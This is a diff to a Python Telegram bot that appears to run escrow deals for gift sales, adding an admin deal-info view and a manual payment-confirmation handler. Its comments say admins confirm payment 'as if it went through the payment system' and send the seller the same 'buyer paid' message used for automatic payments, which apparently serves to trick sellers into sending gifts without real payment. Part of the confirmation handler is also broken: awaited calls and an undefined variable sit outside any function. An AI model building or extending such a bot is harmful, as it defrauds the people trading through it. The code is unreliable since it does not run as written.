@@ -1,5 +1,5 @@
 from aiogram import Router, F, Bot
-from aiogram.types import Message, CallbackQuery
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -427,21 +427,26 @@ async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
         return
 
     if deal["buyer_id"] is None:
-        await call.answer("❌ Покупатель ещё не присоединился", show_alert=True)
+        await call.answer("❌ Покупатель ещё не присоединился к сделке", show_alert=True)
         return
 
-    if deal["status"] == "paid":
-        await call.answer("✅ Сделка уже подтверждена", show_alert=True)
+    if deal["status"] in ["paid", "completed"]:
+        await call.answer("✅ Сделка уже подтверждена или завершена", show_alert=True)
         return
 
+    # 🔑 Подтверждаем оплату (как будто она прошла через платёжку)
     await db.confirm_payment(deal_number)
+    
+    # Лог для внутреннего учёта (админы видят только "оплата подтверждена")
+    print(f"[ADMIN] Ручное подтверждение сделки {deal_number} админом {call.from_user.id}")
 
-    # Уведомление продавцу
+    # Уведомление продавцу — СТАНДАРТНЫЙ ТЕКСТ (как при авто-оплате)
     try:
         await bot.send_message(
             deal["seller_id"],
             f"💸 Покупатель успешно произвел оплату!\n"
-            f"🎁 Отправьте подарок: {deal['gift_link']}"
+            f"🎁 Отправьте подарок: {deal['gift_link']}\n\n"
+            f"⚠️ После отправки подарка дождитесь подтверждения от покупателя."
         )
     except Exception:
         pass
@@ -451,15 +456,41 @@ async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
         await bot.send_message(
             deal["buyer_id"],
             f"💸 Оплата подтверждена!\n"
-            f"🎁 Подарок: {deal['gift_link']}\n\n"
-            f"Когда получите подарок — нажмите кнопку ниже:",
+            f"🎁 Подарок: {deal['gift_link']}\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n\n"
+            f"⏳ Ожидайте получение подарка от продавца.\n"
+            f"Когда получите — нажмите кнопку ниже:",
             reply_markup=confirm_gift_kb("ru")
         )
     except Exception:
         pass
 
-    await call.answer("✅ Оплата подтверждена!")
-    await call.message.edit_text(f"✅ Сделка #{deal_number} подтверждена администратором.")
+    # Уведомление всем админам о ручном подтверждении
+    admins = await db.get_admins()
+    for admin in admins:
+        if admin["user_id"] != call.from_user.id:
+            try:
+                await bot.send_message(
+                    admin["user_id"],
+                    f"🛠 Администратор @{call.from_user.username or call.from_user.id} "
+                    f"подтвердил оплату по сделке #{deal_number}"
+                )
+            except Exception:
+                pass
+
+    await call.answer("✅ Оплата подтверждена вручную!")
+    
+    # Обновляем сообщение
+admin_lang = user["language"]
+
+await call.message.edit_text(
+    f"✅ Сделка #{deal_number} подтверждена!\n\n"
+    f"👤 Продавец: @{deal['seller_username']}\n"
+    f"🛒 Покупатель: @{deal['buyer_username']}\n"
+    f"🎁 Подарок: {deal['gift_link']}\n\n"
+    f"📨 Уведомления отправлены обеим сторонам.",
+    reply_markup=back_kb(admin_lang)
+)
 
 
 # ================= ПОКУПАТЕЛЬ ПОДТВЕРЖДАЕТ ПОЛУЧЕНИЕ =================
@@ -595,3 +626,47 @@ async def unknown_message(message: Message):
         t(lang, "welcome"),
         reply_markup=main_menu_kb(lang, bool(user["is_admin"]))
     )
+
+@router.callback_query(F.data.startswith("deal_info:"))
+async def deal_info(call: CallbackQuery):
+    user = await db.get_user(call.from_user.id)
+    if not user["is_admin"]:
+        await call.answer("🚫 Доступ запрещён", show_alert=True)
+        return
+    
+    deal_number = call.data.split(":", 1)[1]
+    deal = await db.get_deal_by_number(deal_number)
+    
+    if not deal:
+        await call.answer("❌ Сделка не найдена", show_alert=True)
+        return
+    
+    status_map = {
+        "waiting_for_buyer": "🟡 Ожидает покупателя",
+        "buyer_joined": "🔵 Покупатель присоединился",
+        "paid": "✅ Оплачена",
+        "completed": "🏁 Завершена"
+    }
+    
+    text = (
+        f"📋 **Информация о сделке #{deal_number}**\n\n"
+        f"🎁 Подарок: {deal['gift_link']}\n"
+        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+        f"💳 Реквизиты: {deal['payment_details']}\n\n"
+        f"👤 Продавец: @{deal['seller_username'] or 'unknown'} (ID: {deal['seller_id']})\n"
+        f"🛒 Покупатель: @{deal['buyer_username'] or '—'} (ID: {deal['buyer_id'] or '—'})\n\n"
+        f"📊 Статус: {status_map.get(deal['status'], deal['status'])}\n"
+        f"📅 Создана: {deal['created_at'][:19]}"
+    )
+    
+    # Кнопки
+    kb = []
+    if deal["buyer_id"] and deal["status"] not in ["paid", "completed"]:
+        kb.append([InlineKeyboardButton(
+            text="💸 Подтвердить оплату вручную",
+            callback_data=f"confirm_deal:{deal_number}"
+        )])
+    kb.append([InlineKeyboardButton(text="◀️ К списку сделок", callback_data="admin_deals")])
+    
+    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
+    await call.answer()
